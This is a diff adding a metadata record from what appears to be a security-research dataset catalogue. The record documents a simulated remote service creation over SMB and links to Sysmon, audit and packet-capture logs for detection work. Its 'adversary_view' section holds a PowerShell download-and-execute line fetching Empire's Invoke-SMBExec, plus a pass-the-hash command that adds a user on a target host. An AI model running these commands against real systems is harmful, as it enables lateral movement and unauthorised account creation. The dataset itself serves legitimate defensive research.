@@ -1,0 +1,63 @@
+id: 190518-RemoteServiceCreation-RPCOverSMB
+title: Remote Service Creation via RPC over SMB
+description: This dataset represents adversaries remotely creating and starting a service via RPC methods over SMB named pipes such as svcctl.
+references:
+
+collaborators:
+  - Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2019/05/18
+modification_date: 2022/09/22
+platform:
+  - Windows
+type: atomic
+tags:
+  - RPC CreateService
+  - RPC StartService
+  - SMB Svcctl
+
+attack_mappings:
+  - technique: T1021
+    sub-technique: "002"
+    tactics:
+      - TA0008
+
+datasets:
+  endpoint:
+    - log_source: Microsoft-Windows-Sysmon
+      size: 761.04 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/DC01_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 175.23 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/DC01_Windows_Security.zip
+    - log_source: Service Control Manager
+      size: 2.18 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/DC01_Windows_System.zip
+    - log_source: Microsoft-Windows-Sysmon
+      size: 925.33 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/WORKSTATION6_Windows_MicrosoftWindowsSysmonOperational.zip
+    - log_source: Microsoft-Windows-Security-Auditing
+      size: 15.93 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/WORKSTATION6_Windows_Security.zip
+  network:
+    - log_source: Wireshark
+      size: 266.92 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/WORKSTATION5_Windows_PCAP.zip
+    - log_source: Wireshark
+      size: 106.27 kB
+      link: https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/190518-RemoteServiceCreation-RPCOverSMB/WORKSTATION6_Windows_PCAP.zip
+
+simulation:
+  environment: Mordor shire
+  tools:
+    - type: Manual
+      name: PowerShell
+      module: PowerShell
+      script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1
+  permissions_required:
+    - Administrator 
+  adversary_view: |-
+    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-SMBExec.ps1')
+    PS C:\Windows\system32>
+    PS C:\Windows\system32> Invoke-SMBExec -Target 192.168.2.4 -Domain mssentinel.local -Username pgustavo -Hash $hash -Command "net user SMBExec Fall2022 /add"
+    Command executed with service UNJRBWVOFQMMTPMFOUCO on 192.168.2.4
+    PS C:\Windows\system32>
